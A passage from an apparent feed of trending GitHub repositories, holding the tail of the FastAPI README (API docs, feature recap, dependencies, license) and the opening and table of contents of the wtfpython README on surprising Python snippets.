item_id}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The server should reload automatically (because you added &lt;code&gt;--reload&lt;/code&gt; to the &lt;code&gt;uvicorn&lt;/code&gt; command above).&lt;/p&gt; &#xA;&lt;h3&gt;Interactive API docs upgrade&lt;/h3&gt; &#xA;&lt;p&gt;Now go to &lt;a href=&#34;http://127.0.0.1:8000/docs&#34; class=&#34;external-link&#34; target=&#34;_blank&#34;&gt;&lt;/a&gt;&lt;a href=&#34;http://127.0.0.1:8000/docs&#34;&gt;http://127.0.0.1:8000/docs&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The interactive API documentation will be automatically updated, including the new body:&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://fastapi.tiangolo.com/img/index/index-03-swagger-02.png&#34; alt=&#34;Swagger UI&#34;&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Click on the button &#34;Try it out&#34;, it allows you to fill the parameters and directly interact with the API:&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://fastapi.tiangolo.com/img/index/index-04-swagger-03.png&#34; alt=&#34;Swagger UI interaction&#34;&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Then click on the &#34;Execute&#34; button, the user interface will communicate with your API, send the parameters, get the results and show them on the screen:&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://fastapi.tiangolo.com/img/index/index-05-swagger-04.png&#34; alt=&#34;Swagger UI interaction&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Alternative API docs upgrade&lt;/h3&gt; &#xA;&lt;p&gt;And now, go to &lt;a href=&#34;http://127.0.0.1:8000/redoc&#34; class=&#34;external-link&#34; target=&#34;_blank&#34;&gt;&lt;/a&gt;&lt;a href=&#34;http://127.0.0.1:8000/redoc&#34;&gt;http://127.0.0.1:8000/redoc&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The alternative documentation will also reflect the new query parameter and body:&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://fastapi.tiangolo.com/img/index/index-06-redoc-02.png&#34; alt=&#34;ReDoc&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Recap&lt;/h3&gt; &#xA;&lt;p&gt;In summary, you declare &lt;strong&gt;once&lt;/strong&gt; the types of parameters, body, etc. as function parameters.&lt;/p&gt; &#xA;&lt;p&gt;You do that with standard modern Python types.&lt;/p&gt; &#xA;&lt;p&gt;You don&#39;t have to learn a new syntax, the methods or classes of a specific library, etc.&lt;/p&gt; &#xA;&lt;p&gt;Just standard &lt;strong&gt;Python 3.6+&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;p&gt;For example, for an &lt;code&gt;int&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-Python&#34;&gt;item_id: int&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;or for a more complex &lt;code&gt;Item&lt;/code&gt; model:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-Python&#34;&gt;item: Item&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;...and with that single declaration you get:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Editor support, including: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Completion.&lt;/li&gt; &#xA;   &lt;li&gt;Type checks.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Validation of data: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Automatic and clear errors when the data is invalid.&lt;/li&gt; &#xA;   &lt;li&gt;Validation even for deeply nested JSON objects.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;abbr title=&#34;also known as: serialization, parsing, marshalling&#34;&gt;Conversion&lt;/abbr&gt; of input data: coming from the network to Python data and types. Reading from: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;JSON.&lt;/li&gt; &#xA;   &lt;li&gt;Path parameters.&lt;/li&gt; &#xA;   &lt;li&gt;Query parameters.&lt;/li&gt; &#xA;   &lt;li&gt;Cookies.&lt;/li&gt; &#xA;   &lt;li&gt;Headers.&lt;/li&gt; &#xA;   &lt;li&gt;Forms.&lt;/li&gt; &#xA;   &lt;li&gt;Files.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;abbr title=&#34;also known as: serialization, parsing, marshalling&#34;&gt;Conversion&lt;/abbr&gt; of output data: converting from Python data and types to network data (as JSON): &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Convert Python types (&lt;code&gt;str&lt;/code&gt;, &lt;code&gt;int&lt;/code&gt;, &lt;code&gt;float&lt;/code&gt;, &lt;code&gt;bool&lt;/code&gt;, &lt;code&gt;list&lt;/code&gt;, etc).&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;datetime&lt;/code&gt; objects.&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;UUID&lt;/code&gt; objects.&lt;/li&gt; &#xA;   &lt;li&gt;Database models.&lt;/li&gt; &#xA;   &lt;li&gt;...and many more.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Automatic interactive API documentation, including 2 alternative user interfaces: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Swagger UI.&lt;/li&gt; &#xA;   &lt;li&gt;ReDoc.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;Coming back to the previous code example, &lt;strong&gt;FastAPI&lt;/strong&gt; will:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Validate that there is an &lt;code&gt;item_id&lt;/code&gt; in the path for &lt;code&gt;GET&lt;/code&gt; and &lt;code&gt;PUT&lt;/code&gt; requests.&lt;/li&gt; &#xA; &lt;li&gt;Validate that the &lt;code&gt;item_id&lt;/code&gt; is of type &lt;code&gt;int&lt;/code&gt; for &lt;code&gt;GET&lt;/code&gt; and &lt;code&gt;PUT&lt;/code&gt; requests. &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;If it is not, the client will see a useful, clear error.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Check if there is an optional query parameter named &lt;code&gt;q&lt;/code&gt; (as in &lt;code&gt;http://127.0.0.1:8000/items/foo?q=somequery&lt;/code&gt;) for &lt;code&gt;GET&lt;/code&gt; requests. &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;As the &lt;code&gt;q&lt;/code&gt; parameter is declared with &lt;code&gt;= None&lt;/code&gt;, it is optional.&lt;/li&gt; &#xA;   &lt;li&gt;Without the &lt;code&gt;None&lt;/code&gt; it would be required (as is the body in the case with &lt;code&gt;PUT&lt;/code&gt;).&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;For &lt;code&gt;PUT&lt;/code&gt; requests to &lt;code&gt;/items/{item_id}&lt;/code&gt;, Read the body as JSON: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Check that it has a required attribute &lt;code&gt;name&lt;/code&gt; that should be a &lt;code&gt;str&lt;/code&gt;.&lt;/li&gt; &#xA;   &lt;li&gt;Check that it has a required attribute &lt;code&gt;price&lt;/code&gt; that has to be a &lt;code&gt;float&lt;/code&gt;.&lt;/li&gt; &#xA;   &lt;li&gt;Check that it has an optional attribute &lt;code&gt;is_offer&lt;/code&gt;, that should be a &lt;code&gt;bool&lt;/code&gt;, if present.&lt;/li&gt; &#xA;   &lt;li&gt;All this would also work for deeply nested JSON objects.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Convert from and to JSON automatically.&lt;/li&gt; &#xA; &lt;li&gt;Document everything with OpenAPI, that can be used by: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Interactive documentation systems.&lt;/li&gt; &#xA;   &lt;li&gt;Automatic client code generation systems, for many languages.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Provide 2 interactive documentation web interfaces directly.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;We just scratched the surface, but you already get the idea of how it all works.&lt;/p&gt; &#xA;&lt;p&gt;Try changing the line with:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-Python&#34;&gt;    return {&#34;item_name&#34;: item.name, &#34;item_id&#34;: item_id}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;...from:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-Python&#34;&gt;        ... &#34;item_name&#34;: item.name ...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;...to:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-Python&#34;&gt;        ... &#34;item_price&#34;: item.price ...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;...and see how your editor will auto-complete the attributes and know their types:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://fastapi.tiangolo.com/img/vscode-completion.png&#34; alt=&#34;editor support&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;For a more complete example including more features, see the &lt;a href=&#34;https://fastapi.tiangolo.com/tutorial/&#34;&gt;Tutorial - User Guide&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Spoiler alert&lt;/strong&gt;: the tutorial - user guide includes:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Declaration of &lt;strong&gt;parameters&lt;/strong&gt; from other different places as: &lt;strong&gt;headers&lt;/strong&gt;, &lt;strong&gt;cookies&lt;/strong&gt;, &lt;strong&gt;form fields&lt;/strong&gt; and &lt;strong&gt;files&lt;/strong&gt;.&lt;/li&gt; &#xA; &lt;li&gt;How to set &lt;strong&gt;validation constraints&lt;/strong&gt; as &lt;code&gt;maximum_length&lt;/code&gt; or &lt;code&gt;regex&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;A very powerful and easy to use &lt;strong&gt;&lt;abbr title=&#34;also known as components, resources, providers, services, injectables&#34;&gt;Dependency Injection&lt;/abbr&gt;&lt;/strong&gt; system.&lt;/li&gt; &#xA; &lt;li&gt;Security and authentication, including support for &lt;strong&gt;OAuth2&lt;/strong&gt; with &lt;strong&gt;JWT tokens&lt;/strong&gt; and &lt;strong&gt;HTTP Basic&lt;/strong&gt; auth.&lt;/li&gt; &#xA; &lt;li&gt;More advanced (but equally easy) techniques for declaring &lt;strong&gt;deeply nested JSON models&lt;/strong&gt; (thanks to Pydantic).&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;GraphQL&lt;/strong&gt; integration with &lt;a href=&#34;https://strawberry.rocks&#34; class=&#34;external-link&#34; target=&#34;_blank&#34;&gt;Strawberry&lt;/a&gt; and other libraries.&lt;/li&gt; &#xA; &lt;li&gt;Many extra features (thanks to Starlette) as: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;strong&gt;WebSockets&lt;/strong&gt;&lt;/li&gt; &#xA;   &lt;li&gt;extremely easy tests based on &lt;code&gt;requests&lt;/code&gt; and &lt;code&gt;pytest&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;strong&gt;CORS&lt;/strong&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;strong&gt;Cookie Sessions&lt;/strong&gt;&lt;/li&gt; &#xA;   &lt;li&gt;...and more.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Performance&lt;/h2&gt; &#xA;&lt;p&gt;Independent TechEmpower benchmarks show &lt;strong&gt;FastAPI&lt;/strong&gt; applications running under Uvicorn as &lt;a href=&#34;https://www.techempower.com/benchmarks/#section=test&amp;amp;runid=7464e520-0dc2-473d-bd34-dbdfd7e85911&amp;amp;hw=ph&amp;amp;test=query&amp;amp;l=zijzen-7&#34; class=&#34;external-link&#34; target=&#34;_blank&#34;&gt;one of the fastest Python frameworks available&lt;/a&gt;, only below Starlette and Uvicorn themselves (used internally by FastAPI). (*)&lt;/p&gt; &#xA;&lt;p&gt;To understand more about it, see the section &lt;a href=&#34;https://fastapi.tiangolo.com/benchmarks/&#34; class=&#34;internal-link&#34; target=&#34;_blank&#34;&gt;Benchmarks&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Optional Dependencies&lt;/h2&gt; &#xA;&lt;p&gt;Used by Pydantic:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/esnme/ultrajson&#34; target=&#34;_blank&#34;&gt;&lt;code&gt;ujson&lt;/code&gt;&lt;/a&gt; - for faster JSON &lt;abbr title=&#34;converting the string that comes from an HTTP request into Python data&#34;&gt;&#34;parsing&#34;&lt;/abbr&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/JoshData/python-email-validator&#34; target=&#34;_blank&#34;&gt;&lt;code&gt;email_validator&lt;/code&gt;&lt;/a&gt; - for email validation.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Used by Starlette:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://requests.readthedocs.io&#34; target=&#34;_blank&#34;&gt;&lt;code&gt;requests&lt;/code&gt;&lt;/a&gt; - Required if you want to use the &lt;code&gt;TestClient&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://jinja.palletsprojects.com&#34; target=&#34;_blank&#34;&gt;&lt;code&gt;jinja2&lt;/code&gt;&lt;/a&gt; - Required if you want to use the default template configuration.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://andrew-d.github.io/python-multipart/&#34; target=&#34;_blank&#34;&gt;&lt;code&gt;python-multipart&lt;/code&gt;&lt;/a&gt; - Required if you want to support form &lt;abbr title=&#34;converting the string that comes from an HTTP request into Python data&#34;&gt;&#34;parsing&#34;&lt;/abbr&gt;, with &lt;code&gt;request.form()&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://pythonhosted.org/itsdangerous/&#34; target=&#34;_blank&#34;&gt;&lt;code&gt;itsdangerous&lt;/code&gt;&lt;/a&gt; - Required for &lt;code&gt;SessionMiddleware&lt;/code&gt; support.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://pyyaml.org/wiki/PyYAMLDocumentation&#34; target=&#34;_blank&#34;&gt;&lt;code&gt;pyyaml&lt;/code&gt;&lt;/a&gt; - Required for Starlette&#39;s &lt;code&gt;SchemaGenerator&lt;/code&gt; support (you probably don&#39;t need it with FastAPI).&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/esnme/ultrajson&#34; target=&#34;_blank&#34;&gt;&lt;code&gt;ujson&lt;/code&gt;&lt;/a&gt; - Required if you want to use &lt;code&gt;UJSONResponse&lt;/code&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Used by FastAPI / Starlette:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.uvicorn.org&#34; target=&#34;_blank&#34;&gt;&lt;code&gt;uvicorn&lt;/code&gt;&lt;/a&gt; - for the server that loads and serves your application.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ijl/orjson&#34; target=&#34;_blank&#34;&gt;&lt;code&gt;orjson&lt;/code&gt;&lt;/a&gt; - Required if you want to use &lt;code&gt;ORJSONResponse&lt;/code&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;You can install all of these with &lt;code&gt;pip install &#34;fastapi[all]&#34;&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;This project is licensed under the terms of the MIT license.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>satwikkansal/wtfpython</title>
    <updated>2022-06-02T01:32:44Z</updated>
    <id>tag:github.com,2022-06-02:/satwikkansal/wtfpython</id>
    <link href="https://github.com/satwikkansal/wtfpython" rel="alternate"></link>
    <summary type="html">&lt;p&gt;What the f*ck Python? 😱&lt;/p&gt;&lt;hr&gt;&lt;p align=&#34;center&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/images/logo.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h1 align=&#34;center&#34;&gt;What the f*ck Python! 😱&lt;/h1&gt; &#xA;&lt;p align=&#34;center&#34;&gt;Exploring and understanding Python through surprising snippets.&lt;/p&gt; &#xA;&lt;p&gt;Translations: &lt;a href=&#34;https://github.com/robertparley/wtfpython-cn&#34;&gt;Chinese 中文&lt;/a&gt; | &lt;a href=&#34;https://github.com/vuduclyunitn/wtfptyhon-vi&#34;&gt;Vietnamese Tiếng Việt&lt;/a&gt; | &lt;a href=&#34;https://web.archive.org/web/20220511161045/https://github.com/JoseDeFreitas/wtfpython-es&#34;&gt;Spanish Español&lt;/a&gt; | &lt;a href=&#34;https://github.com/buttercrab/wtfpython-ko&#34;&gt;Korean 한국어&lt;/a&gt; | &lt;a href=&#34;https://github.com/satwikkansal/wtfpython/issues/new?title=Add%20translation%20for%20%5BLANGUAGE%5D&amp;amp;body=Expected%20time%20to%20finish:%20%5BX%5D%20weeks.%20I%27ll%20start%20working%20on%20it%20from%20%5BY%5D.&#34;&gt;Add translation&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Other modes: &lt;a href=&#34;https://colab.research.google.com/github/satwikkansal/wtfpython/blob/master/irrelevant/wtf.ipynb&#34;&gt;Interactive&lt;/a&gt; | &lt;a href=&#34;https://pypi.python.org/pypi/wtfpython&#34;&gt;CLI&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Python, being a beautifully designed high-level and interpreter-based programming language, provides us with many features for the programmer&#39;s comfort. But sometimes, the outcomes of a Python snippet may not seem obvious at first sight.&lt;/p&gt; &#xA;&lt;p&gt;Here&#39;s a fun project attempting to explain what exactly is happening under the hood for some counter-intuitive snippets and lesser-known features in Python.&lt;/p&gt; &#xA;&lt;p&gt;While some of the examples you see below may not be WTFs in the truest sense, but they&#39;ll reveal some of the interesting parts of Python that you might be unaware of. I find it a nice way to learn the internals of a programming language, and I believe that you&#39;ll find it interesting too!&lt;/p&gt; &#xA;&lt;p&gt;If you&#39;re an experienced Python programmer, you can take it as a challenge to get most of them right in the first attempt. You may have already experienced some of them before, and I might be able to revive sweet old memories of yours! &lt;span&gt;😅&lt;/span&gt;&lt;/p&gt; &#xA;&lt;p&gt;PS: If you&#39;re a returning reader, you can learn about the new modifications &lt;a href=&#34;https://github.com/satwikkansal/wtfpython/releases/&#34;&gt;here&lt;/a&gt; (the examples marked with asterisk are the ones added in the latest major revision).&lt;/p&gt; &#xA;&lt;p&gt;So, here we go...&lt;/p&gt; &#xA;&lt;h1&gt;Table of Contents&lt;/h1&gt; &#xA;&lt;!-- Generated using &#34;markdown-toc -i README.md --maxdepth 3&#34;--&gt; &#xA;&lt;!-- toc --&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#structure-of-the-examples&#34;&gt;Structure of the Examples&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-some-fancy-title&#34;&gt;▶ Some fancy Title&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#usage&#34;&gt;Usage&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-examples&#34;&gt;👀 Examples&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#section-strain-your-brain&#34;&gt;Section: Strain your brain!&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-first-things-first-&#34;&gt;▶ First things first! *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-strings-can-be-tricky-sometimes&#34;&gt;▶ Strings can be tricky sometimes&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-be-careful-with-chained-operations&#34;&gt;▶ Be careful with chained operations&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-how-not-to-use-is-operator&#34;&gt;▶ How not to use &lt;code&gt;is&lt;/code&gt; operator&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-hash-brownies&#34;&gt;▶ Hash brownies&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-deep-down-were-all-the-same&#34;&gt;▶ Deep down, we&#39;re all the same.&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-disorder-within-order-&#34;&gt;▶ Disorder within order *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-keep-trying-&#34;&gt;▶ Keep trying... *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-for-what&#34;&gt;▶ For what?&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-evaluation-time-discrepancy&#34;&gt;▶ Evaluation time discrepancy&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-is-not--is-not-is-not-&#34;&gt;▶ &lt;code&gt;is not ...&lt;/code&gt; is not &lt;code&gt;is (not ...)&lt;/code&gt;&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-a-tic-tac-toe-where-x-wins-in-the-first-attempt&#34;&gt;▶ A tic-tac-toe where X wins in the first attempt!&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-schr%C3%B6dingers-variable-&#34;&gt;▶ Schrödinger&#39;s variable&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-the-chicken-egg-problem-&#34;&gt;▶ The chicken-egg problem *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-subclass-relationships&#34;&gt;▶ Subclass relationships&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-methods-equality-and-identity&#34;&gt;▶ Methods equality and identity&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-all-true-ation-&#34;&gt;▶ All-true-ation *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-the-surprising-comma&#34;&gt;▶ The surprising comma&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-strings-and-the-backslashes&#34;&gt;▶ Strings and the backslashes&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-not-knot&#34;&gt;▶ not knot!&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-half-triple-quoted-strings&#34;&gt;▶ Half triple-quoted strings&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-whats-wrong-with-booleans&#34;&gt;▶ What&#39;s wrong with booleans?&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-class-attributes-and-instance-attributes&#34;&gt;▶ Class attributes and instance attributes&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-yielding-none&#34;&gt;▶ yielding None&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-yielding-from-return-&#34;&gt;▶ Yielding from... return! *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-nan-reflexivity-&#34;&gt;▶ Nan-reflexivity *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-mutating-the-immutable&#34;&gt;▶ Mutating the immutable!&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-the-disappearing-variable-from-outer-scope&#34;&gt;▶ The disappearing variable from outer scope&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-the-mysterious-key-type-conversion&#34;&gt;▶ The mysterious key type conversion&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-lets-see-if-you-can-guess-this&#34;&gt;▶ Let&#39;s see if you can guess this?&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#section-slippery-slopes&#34;&gt;Section: Slippery Slopes&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-modifying-a-dictionary-while-iterating-over-it&#34;&gt;▶ Modifying a dictionary while iterating over it&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-stubborn-del-operation&#34;&gt;▶ Stubborn &lt;code&gt;del&lt;/code&gt; operation&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-the-out-of-scope-variable&#34;&gt;▶ The out of scope variable&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-deleting-a-list-item-while-iterating&#34;&gt;▶ Deleting a list item while iterating&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-lossy-zip-of-iterators-&#34;&gt;▶ Lossy zip of iterators *&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-loop-variables-leaking-out&#34;&gt;▶ Loop variables leaking out!&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-beware-of-default-mutable-arguments&#34;&gt;▶ Beware of default mutable arguments!&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-catching-the-exceptions&#34;&gt;▶ Catching the Exceptions&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/#-same-operands-different-story&#34;&gt;▶ Same operands, different story!&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a 